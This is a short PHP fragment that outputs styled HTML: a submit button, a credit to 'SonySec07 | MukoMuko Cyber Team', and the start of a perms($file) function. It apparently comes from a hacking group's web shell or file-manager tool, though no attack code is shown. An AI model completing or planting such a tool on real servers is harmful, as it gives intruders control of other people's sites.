...
<input type="submit" value="TUSBOLL" style="margin-top:4px;width:100px;height:27px;font-family:Kelly Slab;font-size:15;background:black;color: white;border:2px solid white;border-radius:5px"/>';
...
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 5px white; font-weight:bold: white; font-size:15px; letter-spacing: 5px;"> SonySec07 | MukoMuko Cyber Team</center>
</body>
</html>';
function perms($file){
